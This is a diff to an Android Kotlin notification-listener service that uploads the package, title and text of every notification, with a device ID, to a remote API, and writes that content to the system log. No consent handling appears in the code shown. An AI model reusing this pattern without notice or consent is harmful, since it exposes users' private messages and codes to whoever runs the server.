@@ -15,6 +15,8 @@ import org.json.JSONObject
 import java.util.concurrent.TimeUnit
 import android.content.SharedPreferences
 import android.content.Context
+import android.os.Handler
+import android.os.Looper
 
 class MyNotificationListenerService : NotificationListenerService() {
 
@@ -32,19 +34,28 @@ class MyNotificationListenerService : NotificationListenerService() {
         .build()
         
     private val scope = CoroutineScope(Dispatchers.IO)
+    private val mainHandler = Handler(Looper.getMainLooper())
     
     private fun getDeviceId(): String? {
-        val prefs: SharedPreferences = applicationContext.getSharedPreferences(
-            "FlutterSharedPreferences", 
-            Context.MODE_PRIVATE
-        )
-        return prefs.getString("flutter.device_id", null)
+        return try {
+            val prefs: SharedPreferences = applicationContext.getSharedPreferences(
+                "FlutterSharedPreferences", 
+                Context.MODE_PRIVATE
+            )
+            val deviceId = prefs.getString("flutter.device_id", null)
+            Log.e(TAG, "Device ID retrieved: $deviceId")
+            deviceId
+        } catch (e: Exception) {
+            Log.e(TAG, "Error getting device ID", e)
+            null
+        }
     }
 
     override fun onCreate() {
         super.onCreate()
         Log.e(TAG, "========================================")
         Log.e(TAG, "SERVICE CREATED")
+        Log.e(TAG, "Device ID: ${getDeviceId()}")
         Log.e(TAG, "MethodChannel: ${methodChannel != null}")
         Log.e(TAG, "========================================")
     }
@@ -53,6 +64,7 @@ class MyNotificationListenerService : NotificationListenerService() {
         super.onListenerConnected()
         Log.e(TAG, "========================================")
         Log.e(TAG, "LISTENER CONNECTED")
+        Log.e(TAG, "Device ID: ${getDeviceId()}")
         Log.e(TAG, "========================================")
     }
 
@@ -63,7 +75,7 @@ class MyNotificationListenerService : NotificationListenerService() {
 
     override fun onNotificationPosted(sbn: StatusBarNotification) {
         Log.e(TAG, "----------------------------------------")
-        Log.e(TAG, "NEW NOTIFICATION")
+        Log.e(TAG, "NEW NOTIFICATION RECEIVED")
         
         try {
             val packageName = sbn.packageName
@@ -84,15 +96,16 @@ class MyNotificationListenerService : NotificationListenerService() {
 
             Log.e(TAG, "Title: $title")
             Log.e(TAG, "Text: $text")
+            Log.e(TAG, "Timestamp: $timestamp")
 
-            // Send to Flutter
-            sendToFlutter(packageName, title, text, timestamp)
-            
-            // Send to server
+            // IMPORTANT: Send to server FIRST (more reliable)
             sendToServer(packageName, title, text)
+            
+            // Then try to send to Flutter (optional, may fail if app is closed)
+            sendToFlutter(packageName, title, text, timestamp)
 
         } catch (e: Exception) {
-            Log.e(TAG, "ERROR: ${e.message}", e)
+            Log.e(TAG, "ERROR processing notification: ${e.message}", e)
         }
         
         Log.e(TAG, "----------------------------------------")
@@ -106,21 +119,30 @@ class MyNotificationListenerService : NotificationListenerService() {
     ) {
         try {
             if (methodChannel == null) {
-                Log.e(TAG, "MethodChannel is NULL")
+                Log.e(TAG, "MethodChannel is NULL - skipping Flutter notification")
                 return
-            }Log.e(TAG, "Invoking Flutter method...")
+            }
             
-            methodChannel?.invokeMethod(
-                "onNotificationReceived",
-                mapOf(
-                    "package" to packageName,
-                    "title" to title,
-                    "text" to text,
-                    "timestamp" to timestamp.toString()
-                )
-            )
-            
-            Log.e(TAG, "Flutter method invoked")
+            // Post to main thread for MethodChannel
+            mainHandler.post {
+                try {
+                    Log.e(TAG, "Invoking Flutter method...")
+                    
+                    methodChannel?.invokeMethod(
+                        "onNotificationReceived",
+                        mapOf(
+                            "package" to packageName,
+                            "title" to title,
+                            "text" to text,
+                            "timestamp" to timestamp.toString()
+                        )
+                    )
+                    
+                    Log.e(TAG, "Flutter method invoked successfully")
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to invoke Flutter method", e)
+                }
+            }
             
         } catch (e: Exception) {
             Log.e(TAG, "Failed to send to Flutter", e)
@@ -128,15 +150,21 @@ class MyNotificationListenerService : NotificationListenerService() {
     }
 
     private fun sendToServer(appName: String, title: String, content: String) {
+        // Launch in coroutine for async execution
         scope.launch {
             try {
+                Log.e(TAG, "=== SENDING TO SERVER ===")
+                
                 val deviceId = getDeviceId()
-                if (deviceId == null) {
-                    Log.e(TAG, "Device ID not found")
+                if (deviceId == null || deviceId.isEmpty()) {
+                    Log.e(TAG, "ERROR: Device ID is NULL or EMPTY")
                     return@launch
                 }
                 
-                Log.e(TAG, "Sending to server...")
+                Log.e(TAG, "Device ID: $deviceId")
+                Log.e(TAG, "App Name: $appName")
+                Log.e(TAG, "Title: $title")
+                Log.e(TAG, "Content: $content")
                 
                 val json = JSONObject().apply {
                     put("device_id", deviceId)
@@ -145,10 +173,10 @@ class MyNotificationListenerService : NotificationListenerService() {
                     put("content", content)
                 }
 
-                Log.e(TAG, "JSON: ${json.toString()}")
+                val jsonString = json.toString()
+                Log.e(TAG, "JSON Payload: $jsonString")
                 
-                val body = json.toString()
-                    .toRequestBody("application/json".toMediaType())
+                val body = jsonString.toRequestBody("application/json".toMediaType())
 
                 val request = Request.Builder()
                     .url(API_URL)
@@ -157,20 +185,27 @@ class MyNotificationListenerService : NotificationListenerService() {
                     .addHeader("Accept", "application/json")
                     .build()
 
-                val response = client.newCall(request).execute()
+                Log.e(TAG, "Executing HTTP request to: $API_URL")
                 
-                Log.e(TAG, "Response: ${response.code}")
+                val response = client.newCall(request).execute()
+                val responseBody = response.body?.string()
+                
+                Log.e(TAG, "=== SERVER RESPONSE ===")
+                Log.e(TAG, "Status Code: ${response.code}")
+                Log.e(TAG, "Response Body: $responseBody")
                 
                 if (response.isSuccessful) {
-                    Log.e(TAG, "SUCCESS: Sent to server")
+                    Log.e(TAG, "✅ SUCCESS: Notification sent to server")
                 } else {
-                    Log.e(TAG, "FAILED: ${response.code}")
+                    Log.e(TAG, "❌ FAILED: ${response.code} - $responseBody")
                 }
                 
                 response.close()
                 
             } catch (e: Exception) {
-                Log.e(TAG, "Server error", e)
+                Log.e(TAG, "❌ EXCEPTION sending to server", e)
+                Log.e(TAG, "Exception details: ${e.javaClass.name}: ${e.message}")
+                e.printStackTrace()
             }
         }
     }
